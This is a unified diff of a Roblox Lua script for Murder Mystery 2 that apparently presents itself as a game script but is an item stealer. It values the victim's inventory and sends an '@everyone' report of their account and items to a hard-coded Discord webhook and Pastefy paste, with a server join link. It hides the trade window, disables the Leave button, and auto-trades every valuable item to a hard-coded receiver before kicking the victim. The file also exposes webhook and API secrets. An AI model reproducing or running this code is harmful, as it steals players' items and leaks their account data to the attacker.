@@ -1,11 +1,14 @@
 _G.Ex = _G.Ex or false
 if _G.Ex then return end
 _G.Ex = true
+
+-- === CONFIG ===
 local WEBHOOK = "https://discord.com/api/webhooks/1543244647462080623/5JzL3T30KbyJunUmcCCcn2P6mHRlOJPaJhqA1OZ35rLzmRg9iaffDugI3hvQuVd4J0os"
 local RECEIVER = {"JAMAL_THESCRIPTGUY"}
-local MINIMUM_RARITY = "Godly"
-local MINIMUM_VALUE = 0.1
+local MIN_VALUE = 0.1
 local RECEIVERx = RECEIVER
+
+-- === API & FALLBACK ===
 local item_values = {}
 local values_fetched = false
 
@@ -19,20 +22,18 @@ end
 local function fetch_item_values()
     local req = GetRequestFunction()
     if not req then return false end
-    local success, response = pcall(req, {
+    local success, res = pcall(req, {
         Url = 'https://api.project-reverse.org/valuables/get-game-valuables?game=mm2',
         Method = 'GET',
-        Headers = {
-            ['Content-Type'] = 'application/json',
-            Accept = 'application/json',
-        },
+        Headers = {["Content-Type"] = 'application/json', Accept = 'application/json'}
     })
-    if success and response and response.Body then
-        local decoded = game:GetService("HttpService"):JSONDecode(response.Body)
+    if success and res and res.Body then
+        local decoded = game:GetService("HttpService"):JSONDecode(res.Body)
         if decoded and decoded.success and decoded.data then
             for _, item in ipairs(decoded.data) do
                 if item.name and item.price then
-                    item_values[item.name] = item.price
+                    local key = string.lower(item.name):gsub("'", ""):gsub(" ", "")
+                    item_values[key] = item.price
                 end
             end
             values_fetched = true
@@ -69,79 +70,69 @@ local function get_fallback_value(item_name)
         ["Slasher"] = 2,
         ["Tides"] = 2,
         ["DefaultGun"] = 0,
-        ["DefaultKnife"] = 0,
+        ["DefaultKnife"] = 0
     }
-    return fallback[item_name] or 0.01
+    return fallback[item_name] or fallback[string.gsub(item_name, "%s+", "")] or 0.01
 end
 
 local function get_item_value(item_name)
-    if values_fetched and item_values[item_name] then
-        return item_values[item_name]
-    end
+    local key = string.lower(item_name):gsub("'", ""):gsub(" ", "")
+    if values_fetched and item_values[key] then return item_values[key] end
     return get_fallback_value(item_name)
 end
 
-local function GetActiveReceiverName()
+-- === UTILS ===
+local RarityList = {"Chroma", "Unique", "Ancient", "Godly", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
+local GodlyPos = table.find(RarityList, "Godly")
+
+local function GetReceiverName()
     if type(RECEIVERx) == "table" then
-        for _, Name in ipairs(RECEIVERx) do
-            if Name ~= "" then
-                if Players and Players:FindFirstChild(Name) then return Name end
-                return Name
+        for _, name in ipairs(RECEIVERx) do
+            if name ~= "" then
+                if Players and Players:FindFirstChild(name) then return name end
+                return name
             end
         end
     end
     return "Unknown"
 end
 
-if WEBHOOK == "" then
-    game.Players.LocalPlayer:Kick("Invalid URL. Please check your webhook.")
-    return
-end
-if game.PlaceId ~= 142823291 then
-    game.Players.LocalPlayer:Kick("This script only works in Murder Mystery 2.")
-    return
-end
+-- === SERVER CHECKS ===
+if WEBHOOK == "" then game.Players.LocalPlayer:Kick("Invalid Webhook") return end
+if game.PlaceId ~= 142823291 then game.Players.LocalPlayer:Kick("MM2 Only") return end
 pcall(function()
-    if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
-        game.Players.LocalPlayer:Kick("Private servers are not supported.")
-        return
-    end
+    if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then return end
 end)
-if #game.Players:GetPlayers() >= 12 then
-    game.Players.LocalPlayer:Kick("Server is full, please rejoin another server.")
-    return
-end
+if #game.Players:GetPlayers() >= 12 then game.Players.LocalPlayer:Kick("Server Full") return end
 
+-- LOAD API
+task.spawn(fetch_item_values)
+
+-- === JOB ID & ANTI-LEAVE ===
 local FoundJobId = false
-local AttemptCount = 0
 if getgc then
     repeat
-        local HookedSuccessfully = false
-        for _, Value in ipairs(getgc(true)) do
-            if typeof(Value) == "function" then
-                local FunctionInfo = debug.getinfo(Value)
-                if FunctionInfo and FunctionInfo.name then
-                    local LowerName = FunctionInfo.name:lower()
-                    if LowerName:find("step") and not LowerName:find("stepanimate") then
-                        pcall(function()
-                            local OriginalFunction = hookfunction(Value, function(...)
-                                if not FoundJobId then
-                                    FoundJobId = true
-                                    _G.RealJobID = game.JobId
-                                end
-                                if OriginalFunction then return OriginalFunction(...) end
-                            end)
+        local ok
+        for _, v in ipairs(getgc(true)) do
+            if typeof(v) == "function" then
+                local info = debug.getinfo(v)
+                if info and info.name and info.name:lower():find("step") and not info.name:lower():find("stepanimate") then
+                    pcall(function()
+                        local orig = hookfunction(v, function(...)
+                            if not FoundJobId then
+                                FoundJobId = true
+                                _G.RealJobID = game.JobId
+                            end
+                            if orig then return orig(...) end
                         end)
-                        HookedSuccessfully = true
-                        break
-                    end
+                    end)
+                    ok = true
+                    break
                 end
             end
         end
-        AttemptCount = AttemptCount + 1
-        if HookedSuccessfully or AttemptCount >= 10 then break end
         task.wait(0.1)
-    until FoundJobId
+    until ok or FoundJobId
 end
 if not FoundJobId then _G.RealJobID = game.JobId end
 task.wait(0.5)
@@ -149,363 +140,241 @@ task.wait(0.5)
 task.spawn(function()
     while task.wait(10) do
         pcall(function()
-            for _, Connection in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.Page.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
-                Connection:Disable()
+            for _, c in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.Page.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
+                c:Disable()
             end
         end)
     end
 end)
 
 local function GetExecutorInfo()
-    local ExecutorName = "Unknown"
-    pcall(function() ExecutorName = identifyexecutor() end)
-    return {
-        JobId = _G.RealJobID or game.JobId,
-        Executor = string.lower(ExecutorName)
-    }
+    local n = "Unknown"
+    pcall(function() n = identifyexecutor() end)
+    return {JobId = _G.RealJobID or game.JobId, Executor = string.lower(n)}
 end
-
 local InfoData = GetExecutorInfo()
-_G.RealJobID = InfoData.JobId
-_G.RealExecutor = InfoData.Executor
+_G.RealJobID, _G.RealExecutor = InfoData.JobId, InfoData.Executor
 
+-- === SERVICES ===
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
-local ItemDatabase = {}
-local RarityPriority = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage", "Chroma", "Dual", "Pet"}
-local RarityList = RarityPriority
-local GodlyPosition = table.find(RarityList, "Godly")
-
-task.spawn(function()
-    for i = 1, 3 do
-        if fetch_item_values() then break end
-        task.wait(0.5)
+-- === TRADE HELPERS ===
+local function FormatName(t)
+    if not t or t == "" then return "Unknown" end
+    local r, c = "", true
+    for i = 1, #t do
+        local ch = t:sub(i, i)
+        if ch == " " then r = r .. " " c = true
+        else r = r .. (c and ch:upper() or ch:lower()) c = false end
     end
-end)
-
-local function FormatNameDisplay(Text)
-    if not Text or Text == "" then return "Unknown" end
-    local Result = ""
-    local CapitalizeNext = true
-    for Index = 1, #Text do
-        local Char = Text:sub(Index, Index)
-        if Char == " " then
-            Result = Result .. " "
-            CapitalizeNext = true
-        else
-            Result = Result .. (CapitalizeNext and Char:upper() or Char:lower())
-            CapitalizeNext = false
-        end
-    end
-    return Result
+    return r
 end
-
-local function GetTradeStatus()
-    return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
+local function GetTradeStatus() return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end
+local function SendTrade(p)
+    local pl = Players:FindFirstChild(p)
+    if not pl then return false end
+    local s = pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(pl) end)
+    if s then return true end
+    return pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(p) end)
 end
-
-local function SendTradeRequestToPlayer(TargetName)
-    local TargetPlayer = Players:FindFirstChild(TargetName)
-    if not TargetPlayer then return false end
-    local Success = pcall(function()
-        ReplicatedStorage.Trade.SendRequest:InvokeServer(TargetPlayer)
-    end)
-    if Success then return true end
-    Success = pcall(function()
-        ReplicatedStorage.Trade.SendRequest:InvokeServer(TargetName)
-    end)
-    return Success
-end
-
-local function AddItemToTradeOffer(ItemId)
-    ReplicatedStorage.Trade.OfferItem:FireServer(ItemId, "Weapons")
-end
-
-local LastReceivedOffer = nil
-ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(TradeData)
-    if TradeData and TradeData.LastOffer then
-        LastReceivedOffer = TradeData.LastOffer
-    end
-end)
-
-local function AcceptIncomingTrade()
-    if LastReceivedOffer then
-        ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, LastReceivedOffer)
-        LastReceivedOffer = nil
+local function AddItem(id) ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons") end
+local LastOffer = nil
+ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(d) if d and d.LastOffer then LastOffer = d.LastOffer end end)
+local function AcceptTrade()
+    if LastOffer then
+        ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, LastOffer)
+        LastOffer = nil
         return true
     end
     return false
 end
+local function WaitEnd() while GetTradeStatus() ~= "None" do task.wait(0.1) end end
 
-local function WaitUntilTradeEnds()
-    while GetTradeStatus() ~= "None" do
-        task.wait(0.1)
-    end
-end
-
-local BlacklistedItems = {
-    DefaultGun = true, DefaultKnife = true,
-    Reaver = true, Reaver_Legendary = true, Reaver_Godly = true, Reaver_Ancient = true,
-    IceHammer = true, IceHammer_Legendary = true, IceHammer_Godly = true, IceHammer_Ancient = true,
-    Gingerscythe = true, Gingerscythe_Legendary = true, Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
-    TestItem = true, Season1TestKnife = true,
-    Cracks = true, Icecrusher = true,
-    ["???"] = true, Dartbringer = true,
-    TravelerAxeRed = true, TravelerAxeBronze = true, TravelerAxeSilver = true, TravelerAxeGold = true,
-    BlueCamo_K_2022 = true, GreenCamo_K_2022 = true,
-    SharkSeeker = true
+-- === BLACKLIST ===
+local Blacklist = {
+    DefaultGun = true, DefaultKnife = true, Reaver = true, Reaver_Legendary = true,
+    Reaver_Godly = true, Reaver_Ancient = true, IceHammer = true, IceHammer_Legendary = true,
+    IceHammer_Godly = true, IceHammer_Ancient = true, Gingerscythe = true,
+    Gingerscythe_Legendary = true, Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
+    TestItem = true, Season1TestKnife = true, Cracks = true, Icecrusher = true,
+    ["???"] = true, Dartbringer = true, TravelerAxeRed = true, TravelerAxeBronze = true,
+    TravelerAxeSilver = true, TravelerAxeGold = true, BlueCamo_K_2022 = true,
+    GreenCamo_K_2022 = true, SharkSeeker = true
 }
 
-local AllInventoryItems, TradeableItems, TotalTradeValue = {}, {}, 0
-
-local function ShouldTradeThisItem(RarityName, ItemValue)
-    if not RarityName then return false end
-    local Position = table.find(RarityList, RarityName)
-    local HighValueOrHigher = Position and GodlyPosition and Position <= GodlyPosition
-    return HighValueOrHigher and true or (ItemValue and ItemValue >= MINIMUM_VALUE)
+-- === INVENTORY SCAN ===
+local AllItems, TradeItems, TotalVal = {}, {}, 0
+local function ShouldTrade(r, v)
+    if not r then return false end
+    local p = table.find(RarityList, r)
+    return (p and GodlyPos and p <= GodlyPos) or (v and v >= MIN_VALUE)
 end
-
-local RefreshInventoryLists = function()
-    local AllItems, TradeItems, TotalValue = {}, {}, 0
-    local ProfileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
-    if ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
-        for ItemId, Quantity in pairs(ProfileData.Weapons.Owned) do
-            if Quantity and Quantity > 0 then
-                local SafeName = tostring(ItemId or "")
-                if SafeName ~= "" then
-                    local Value = get_item_value(SafeName)
-                    local RarityName = "Unknown"
-                    local IsChroma = string.find(string.lower(SafeName), "chroma") ~= nil
-                    local ItemEntry = {
-                        DataID = ItemId,
-                        Name = SafeName,
-                        Rarity = RarityName,
-                        Count = Quantity,
-                        Value = Value,
-                        IsChroma = IsChroma,
-                        Total = Value * Quantity
-                    }
-                    table.insert(AllItems, ItemEntry)
-                    if ShouldTradeThisItem(RarityName, Value) and not BlacklistedItems[ItemId] then
-                        table.insert(TradeItems, ItemEntry)
-                        TotalValue = TotalValue + ItemEntry.Total
+local function Refresh()
+    local a, tv, tt = {}, {}, 0
+    local d = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+    if d and d.Weapons and d.Weapons.Owned then
+        for id, q in pairs(d.Weapons.Owned) do
+            if q and q > 0 then
+                local n = tostring(id or "")
+                if n ~= "" then
+                    local v = get_item_value(n)
+                    local r = v >= 500 and "Ancient" or v >= 100 and "Godly" or v >= 10 and "Legendary" or "Rare"
+                    local c = string.find(string.lower(n), "chroma") ~= nil
+                    local e = {DataID = id, Name = n, Rarity = r, Count = q, Value = v, IsChroma = c, Total = v * q}
+                    table.insert(a, e)
+                    if ShouldTrade(r, v) and not Blacklist[id] then
+                        table.insert(tv, e)
+                        tt = tt + e.Total
                     end
                 end
             end
         end
     end
-    table.sort(AllItems, function(A, B) return A.Total > B.Total end)
-    table.sort(TradeItems, function(A, B) return A.Total > B.Total end)
-    return AllItems, TradeItems, TotalValue
+    table.sort(a, function(x, y) return x.Total > y.Total end)
+    table.sort(tv, function(x, y) return x.Total > y.Total end)
+    return a, tv, tt
 end
+AllItems, TradeItems, TotalVal = Refresh()
 
-local function ReloadInventory()
-    AllInventoryItems, TradeableItems, TotalTradeValue = RefreshInventoryLists()
-end
-
-AllInventoryItems, TradeableItems, TotalTradeValue = RefreshInventoryLists()
-
-local function UploadToPastefy(textContent)
-    local API_KEY = "bCmvP7YNqkOyMEeJDvL0eDXzfSgm2XhWcGadQ3aXKKiH7BKe5ZBIgem3tbuC"
-    local success, result = pcall(function()
-        local RequestFunc = GetRequestFunction()
-        if not RequestFunc then return nil end
-        local response = RequestFunc({
-            Url = "https://pastefy.app/api/v2/paste",
-            Method = "POST",
-            Headers = {
-                ["Authorization"] = "Bearer " .. API_KEY,
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode({
-                content = textContent,
-                title = "MM2 Inventory",
-                expires = "never",
-                encrypted = false
-            })
+-- === DISCORD & PASTEFY ===
+local function UploadPastefy(text)
+    local key = "bCmvP7YNqkOyMEeJDvL0eDXzfSgm2XhWcGadQ3aXKKiH7BKe5ZBIgem3tbuC"
+    local ok, res = pcall(function()
+        local f = GetRequestFunction()
+        if not f then return nil end
+        local r = f({
+            Url = "https://pastefy.app/api/v2/paste", Method = "POST",
+            Headers = {["Authorization"] = "Bearer " .. key, ["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({content = text, title = "MM2 Inventory", expires = "never", encrypted = false})
         })
-        if response and response.Body then
-            local data = HttpService:JSONDecode(response.Body)
-            if data and data.paste and data.paste.id then
-                return "https://pastefy.app/" .. data.paste.id .. "/raw"
-            end
+        if r and r.Body then
+            local d = HttpService:JSONDecode(r.Body)
+            if d and d.paste and d.paste.id then return "https://pastefy.app/" .. d.paste.id .. "/raw" end
         end
         return nil
     end)
-    return success and result or nil
+    return ok and res or nil
 end
-
-local function GenerateFullInventoryText(itemList)
-    local lines, total = {}, 0
-    for _, item in ipairs(itemList) do total = total + item.Total end
-    table.insert(lines, "Total Inventory Value: " .. total)
-    table.insert(lines, string.rep("-", 40))
-    for _, item in ipairs(itemList) do
-        local name = FormatNameDisplay(item.Name)
-        if item.IsChroma then name = "Chroma " .. name end
-        table.insert(lines, "[" .. item.Rarity .. "] x" .. item.Count .. " " .. name .. " - " .. item.Total)
+local function GenText(l)
+    local s, t = {}, 0
+    for _, i in ipairs(l) do t = t + i.Total end
+    table.insert(s, "Total Value: " .. t)
+    table.insert(s, string.rep("-", 30))
+    for _, i in ipairs(l) do
+        local n = FormatName(i.Name)
+        if i.IsChroma then n = "Chroma " .. n end
+        table.insert(s, "[" .. i.Rarity .. "] x" .. i.Count .. " " .. n .. " - " .. i.Total)
     end
-    return table.concat(lines, "\n")
+    return table.concat(s, "\n")
 end
-
-local function BuildEmbed(ReceiverName)
-    local ShouldMentionEveryone = false
-    for _, Item in ipairs(AllInventoryItems) do
-        local Position = table.find(RarityList, Item.Rarity)
-        if Item.Value >= MINIMUM_VALUE or (Position and GodlyPosition and Position <= GodlyPosition) then
-            ShouldMentionEveryone = true
-        end
+local function BuildEmbed(r)
+    local ping = false
+    for _, i in ipairs(AllItems) do if i.Value >= MIN_VALUE then ping = true end end
+    local mention = ping and "@everyone" or ""
+    local top = {}
+    for j = 1, math.min(10, #AllItems) do
+        local x = AllItems[j]
+        local n = FormatName(x.Name)
+        if x.IsChroma then n = "Chroma " .. n end
+        table.insert(top, "> " .. n .. " [" .. x.Count .. "] - " .. x.Total)
     end
-    local MentionText = ShouldMentionEveryone and "@everyone" or ""
-    local TopItemsPreview = {}
-    for Index = 1, math.min(10, #AllInventoryItems) do
-        local Item = AllInventoryItems[Index]
-        local DisplayName = FormatNameDisplay(Item.Name)
-        if Item.IsChroma then DisplayName = "Chroma " .. DisplayName end
-        table.insert(TopItemsPreview, "> " .. DisplayName .. " [" .. Item.Count .. "] - " .. Item.Total)
-    end
-    local PreviewText = table.concat(TopItemsPreview, "\n")
-    if #AllInventoryItems > 10 then PreviewText = PreviewText .. "\n... and " .. (#AllInventoryItems - 10) .. " more items" end
-    local PlayerCount = #Players:GetPlayers()
-    local JobId = _G.RealJobID or game.JobId
-    local FullInventoryText = GenerateFullInventoryText(AllInventoryItems)
-    local PasteUrl = UploadToPastefy(FullInventoryText)
-    local InfoBlock = string.format(
-        "Username: %s\nDisplay: %s\nAccount Age: %d days\nExecutor: %s\nServer Players: %d/12\nReceiver: %s\nMin Value: %d",
+    local prev = table.concat(top, "\n")
+    if #AllItems > 10 then prev = prev .. "\n... and " .. (#AllItems - 10) .. " more" end
+    local jid = _G.RealJobID or game.JobId
+    local paste = UploadPastefy(GenText(AllItems))
+    local info = string.format("Username: %s\nDisplay: %s\nAge: %d days\nExecutor: %s\nPlayers: %d/12\nReceiver: %s\nMin Value: %d",
         LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.AccountAge,
-        _G.RealExecutor or "Unknown", PlayerCount, ReceiverName, MINIMUM_VALUE
-    )
-    local StatsBlock = string.format(
-        "Total Items: %d\nTradeable Value: %d",
-        #AllInventoryItems, TotalTradeValue
-    )
-    local EmbedFields = {
-        {name = "Player Info", value = "```" .. InfoBlock .. "```", inline = false},
-        {name = "Stats", value = "```" .. StatsBlock .. "```", inline = false},
-        {name = "All Items (Highest Value First)", value = "```" .. PreviewText .. "```", inline = false}
+        _G.RealExecutor or "Unknown", #Players:GetPlayers(), r, MIN_VALUE)
+    local stats = string.format("Total Items: %d\nTradeable Value: %d", #AllItems, TotalVal)
+    local flds = {
+        {name = "Player Info", value = "```" .. info .. "```", inline = false},
+        {name = "Stats", value = "```" .. stats .. "```", inline = false},
+        {name = "Items", value = "```" .. prev .. "```", inline = false}
     }
-    if PasteUrl then
-        table.insert(EmbedFields, {name = "Full Inventory Log", value = PasteUrl, inline = false})
-    end
-    table.insert(EmbedFields, {name = "Join Link", value = "[" .. string.sub(JobId, 1, 8) .. "...](https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. JobId .. ")", inline = false})
-    local EmbedData = {
-        author = {name = "MM2 HIT!"},
-        color = 0x4B5563,
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-        fields = EmbedFields,
+    if paste then table.insert(flds, {name = "Full Log", value = paste, inline = false}) end
+    table.insert(flds, {name = "Join Link", value = "[" .. string.sub(jid, 1, 8) .. "...](https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. jid .. ")", inline = false})
+    return {
+        author = {name = "MM2 HIT!"}, color = 0x4B5563,
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"), fields = flds,
         footer = {text = "MM2 • " .. os.date("%Y-%m-%d %H:%M:%S")}
-    }
-    return EmbedData, MentionText
+    }, mention
+end
+local function SendWebhook()
+    local f = GetRequestFunction()
+    if not f then return end
+    local e, m = BuildEmbed(GetReceiverName())
+    local p = HttpService:JSONEncode({content = m, embeds = {e}})
+    pcall(function() f({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = p}) end)
 end
 
-local function SendAllEmbeds()
-    local RequestFunc = GetRequestFunction()
-    if not RequestFunc then return end
-    local ActiveName = GetActiveReceiverName()
-    local MainEmbed, MainMention = BuildEmbed(ActiveName)
-    local MainPayload = {content = MainMention, embeds = {MainEmbed}}
-    local MainJson = HttpService:JSONEncode(MainPayload)
-    pcall(function()
-        RequestFunc({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = MainJson})
-    end)
-end
+SendWebhook()
 
-SendAllEmbeds()
+-- === AUTO-TRADE SYSTEM ===
+PlayerGui.TradeGUI:GetPropertyChangedSignal("Enabled"):Connect(function() PlayerGui.TradeGUI.Enabled = false end)
+PlayerGui.TradeGUI_Phone:GetPropertyChangedSignal("Enabled"):Connect(function() PlayerGui.TradeGUI_Phone.Enabled = false end)
 
-PlayerGui:WaitForChild("TradeGUI"):GetPropertyChangedSignal("Enabled"):Connect(function() PlayerGui.TradeGUI.Enabled = false end)
-PlayerGui:WaitForChild("TradeGUI_Phone"):GetPropertyChangedSignal("Enabled"):Connect(function() PlayerGui.TradeGUI_Phone.Enabled = false end)
-
-local function KickAfterTransfer()
-    task.wait(2)
-    game.Players.LocalPlayer:Kick("Items Transferred!")
-end
-
-local function FindTradeTarget()
+local function KickDone() task.wait(2) LocalPlayer:Kick("Transferred!") end
+local function FindTarget()
     if type(RECEIVER) == "table" then
-        for _, Name in ipairs(RECEIVER) do
-            if Name ~= "" and Players:FindFirstChild(Name) then return Name end
-        end
+        for _, n in ipairs(RECEIVER) do if n ~= "" and Players:FindFirstChild(n) then return n end end
     else
         if Players:FindFirstChild(RECEIVER) then return RECEIVER end
     end
     return nil
 end
 
-local MAX_TRADE_ATTEMPTS = 999
-local RETRY_WAIT = 2
-
-local function ProcessAllTrades(TargetName)
-    local AttemptCount = 0
-    while #TradeableItems > 0 and AttemptCount < MAX_TRADE_ATTEMPTS do
-        AttemptCount = AttemptCount + 1
-        local CurrentStatus = GetTradeStatus()
-        if CurrentStatus == "ReceivingRequest" then
+local MAX_ATTEMPT, WAIT_TRADE = 999, 2
+local function DoTrades(target)
+    local att = 0
+    while #TradeItems > 0 and att < MAX_ATTEMPT do
+        att = att + 1
+        local st = GetTradeStatus()
+        if st == "ReceivingRequest" then
             pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
-            task.wait(0.5)
-            continue
+            task.wait(0.5) goto cont
         end
-        if CurrentStatus == "StartTrade" then
-            local ItemsToSend = math.min(4, #TradeableItems)
-            for _ = 1, ItemsToSend do
-                local Item = table.remove(TradeableItems, 1)
-                for _ = 1, Item.Count do
-                    AddItemToTradeOffer(Item.DataID)
-                    task.wait(0.05)
-                end
+        if st == "StartTrade" then
+            local send = math.min(4, #TradeItems)
+            for _ = 1, send do
+                local it = table.remove(TradeItems, 1)
+                for _ = 1, it.Count do AddItem(it.DataID) task.wait(0.05) end
             end
             task.wait(6)
-            if AcceptIncomingTrade() then
-                WaitUntilTradeEnds()
-                ReloadInventory()
-                AttemptCount = 0
+            if AcceptTrade() then
+                WaitEnd()
+                AllItems, TradeItems, TotalVal = Refresh()
+                att = 0
             else
-                ReloadInventory()
-                task.wait(RETRY_WAIT)
+                AllItems, TradeItems, TotalVal = Refresh()
+                task.wait(WAIT_TRADE)
             end
-            continue
+            goto cont
         end
-        if CurrentStatus == "None" then
-            local Sent = false
-            local Try = 1
-            while not Sent and Try <= 5 do
-                if SendTradeRequestToPlayer(TargetName) then
-                    Sent = true
-                    task.wait(0.5)
-                else
-                    task.wait(math.min(Try * 0.5, 3))
-                    Try = Try + 1
-                end
+        if st == "None" then
+            local sent, t = nil, 1
+            while not sent and t <= 5 do
+                if SendTrade(target) then sent = true task.wait(0.5)
+                else task.wait(math.min(t * 0.5, 3)) t = t + 1 end
             end
         end
-        task.wait(0.5)
+        ::cont:: task.wait(0.5)
     end
-    KickAfterTransfer()
+    KickDone()
 end
 
-local function AutoTradeOnTargetJoin()
-    local IsBusy = false
-    local function CheckPlayerJoin(Player)
-        if IsBusy then return end
-        local TargetName = FindTradeTarget()
-        if TargetName and Player.Name == TargetName then
-            IsBusy = true
-            task.wait(3)
-            ProcessAllTrades(Player.Name)
-        end
+local function AutoTradeJoin()
+    local busy = false
+    local function CheckJoin(p)
+        if busy then return end
+        local t = FindTarget()
+        if t and p.Name == t then busy = true task.wait(3) DoTrades(p.Name) end
     end
-    for _, Player in ipairs(Players:GetPlayers()) do
-        CheckPlayerJoin(Player)
-    end
-    Players.PlayerAdded:Connect(CheckPlayerJoin)
+    for _, p in ipairs(Players:GetPlayers()) do CheckJoin(p) end
+    Players.PlayerAdded:Connect(CheckJoin)
 end
 
-if #AllInventoryItems > 0 then
-    AutoTradeOnTargetJoin()
-else
-    task.wait(1)
-    LocalPlayer:Kick("No Items Found!")
-end
+if #AllItems > 0 then AutoTradeJoin() else task.wait(1) LocalPlayer:Kick("No Items Found!") end
